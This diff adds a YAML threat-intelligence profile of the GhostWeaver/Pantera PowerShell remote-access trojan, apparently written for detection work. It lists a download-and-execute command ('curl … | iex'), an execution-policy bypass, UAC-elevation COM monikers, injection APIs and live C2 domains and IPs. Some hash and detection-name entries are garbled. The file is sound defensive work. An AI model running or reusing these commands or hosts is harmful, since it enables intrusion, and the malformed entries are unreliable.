@@ -1,0 +1,85 @@
+description: GhostWeaver is a fileless PowerShell RAT that maintains C2 over GZip-compressed
+  JSON inside TLS 1.0 connections on port 25658.
+attribution: TA582/UNC4108
+malware_families:
+- Pantera
+- GhostWeaver
+TTPs:
+  processes:
+  - powershell.exe
+  - conhost
+  - conhost.exe
+  commandline:
+  - curl -useb {domain}.top/1.php?s={campaign} | iex
+  - conhost --headless powershell
+  - powershell -ep bypass Azure{FunctionName}
+  - conhost --headless powershell -ep bypass Azure{FunctionName}
+  powershell:
+  - Invoke-Expression
+  - Get-MpComputerStatus IsVirtualMachine
+  - Win32_VideoController AdapterDACType
+  - Win32_CacheMemory purpose
+  - ShowWindowAsync
+  - VirtualProtectEx
+  - WriteProcessMemory
+  - CoGetObject("Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}")
+  - ServerCreateElevatedObject({0f87369f-a4e5-4cfc-bd3e-73e6154572dd})
+  - Get-Content + Invoke-Expression
+  - Heur.BZC.PZQ.Pantera.164.*
+  - PowerShell/Agent.BLUKasperskyHEUR:Trojan.PowerShell.Obfus.genLionicTrojan.Script.Pantera.4!cAvast
+    / AVGPwrSh:Agent-AX [Rat]MicrosoftTrojan:PowerShell/Pantera.MV!MTB
+  scripting_engine:
+  - JScript
+  - Python
+  registry_keys:
+  - HKCU:\\Software\\Microsoft\\ExpirienceHost = 1
+  image_load:
+  - user32.dll
+  - amsi.dll
+  network_connections:
+  - curl -useb {domain}.top/1.php?s={campaign} | iex
+  - powershell.exe, 86.107.101.93, 25658
+  - powershell.exe, 178.156.128.182, 25658
+  - powershell.exe, rosettahome.top, 25658
+  - powershell.exe, happychristmas.click, 25658
+  - powershell.exe, amatua.org, 25658
+  - powershell.exe, q632gmdjjxpjsqp.fun, 25658
+  - powershell.exe, 9hsawit1nbfbg9e.top, 25658
+  - powershell.exe, v5fcvlydx1cjsgf.top, 25658
+  - powershell.exe, cup4fqhvsolr3xq.top, 25658
+  - powershell.exe, ga1yo3wu78v48hh.top, 25658
+  - powershell.exe, 0f2onmxtqv5ih2h.top, 25658
+  file_activity:
+  - '%LOCALAPPDATA%\Microsoft\{subfolder}\{FunctionName}.log'
+  persistence:
+  - Scheduled task patternconhost --headless powershell -ep bypass Azure{FunctionName}
+  - CMSTPLUA, PEB masquerade, headless schtask
+IOCs:
+  hashes:
+  - fb0238b388d9448a6b36aca4e6a9e4fbcbac3afc239cb70251778d40351b57652
+  - aa9bc093018e55b23fbb4d9548c4140a3f59162a216ba2df6c82691533dcb435
+  - 006f5bb92720aca33aab33505e17c42cc2f9f236
+  - 3b868b5ac32114ebd3e995a3adb6d6fbbb91440820cf921f73afd41e11249456
+  - 7/76IDTechnique
+  - 1/763b868b5ac32114ebd3e995a3adb6d6fbbb91440820cf921f73afd41e11249456
+  - 7/76IDTechnique
+  ip_addresses:
+  - 167.17.76.102
+  - 64.49.13.171
+  - 86.107.101.93
+  - 25.161.214.209
+  - 25.161.113.150
+  domains:
+  - rosettahome.top
+  - happychristmas.click
+  - amatua.org
+  - q632gmdjjxpjsqp.fun
+  - 9hsawit1nbfbg9e.top
+  - v5fcvlydx1cjsgf.top
+  - cup4fqhvsolr3xq.top
+  - ga1yo3wu78v48hh.top
+  - 0f2onmxtqv5ih2h.top
+  urls: []
+reference: https://www.derp.ca/research/ghostweaver-tag124-powershell-rat/
+date_of_publication: March 08, 2026
+file_creation_date: March 08, 2026
